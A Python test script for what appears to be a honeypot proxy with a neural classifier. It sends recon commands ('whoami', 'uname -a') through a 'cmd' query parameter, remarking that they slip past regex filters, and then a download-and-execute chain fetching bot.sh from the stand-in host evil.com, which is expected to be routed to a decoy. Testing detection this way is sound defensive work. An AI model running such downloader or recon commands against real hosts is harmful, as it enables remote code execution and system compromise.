import requests
import time

def test_http_context():
    proxy_url = "http://127.0.0.1:80"
    
    print("Testing HTTP Context Awareness Pipeline...")
    
    # 1. Send an initial harmless/recon request without special chars so regex misses it
    print("\n[Request 1] Sending a basic recon command: 'whoami'")
    try:
        res1 = requests.get(f"{proxy_url}/?cmd=whoami")
        print(f"Status: {res1.status_code}")
        print(f"Response: {res1.text[:100]}...")
    except Exception as e:
        print(f"Failed: {e}")
        
    time.sleep(1)
        
    # 2. Send another recon command
    print("\n[Request 2] Sending another recon command: 'uname -a'")
    try:
        res2 = requests.get(f"{proxy_url}/?cmd=uname%20-a")
        print(f"Status: {res2.status_code}")
        print(f"Response: {res2.text[:100]}...")
    except Exception as e:
        print(f"Failed: {e}")

    time.sleep(1)

    # 3. Send a command that the neural model explicitly flags as Downloader/Exploit
    # (We use a full download + execute chain that the model was trained on)
    print("\n[Request 3] Sending a downloader command: 'wget http://evil.com/bot.sh; chmod +x bot.sh; ./bot.sh'")
    print("The Neural Model should classify this as 'Downloader' and redirect to the Decoy!")
    try:
        res3 = requests.get(f"{proxy_url}/?cmd=wget%20http://evil.com/bot.sh;%20chmod%20%2Bx%20bot.sh;%20./bot.sh")
        print(f"Status: {res3.status_code}")
        print(f"Response (should be Nginx default page): {res3.text[:100]}...")
    except Exception as e:
        print(f"Failed: {e}")

if __name__ == "__main__":
    test_http_context()
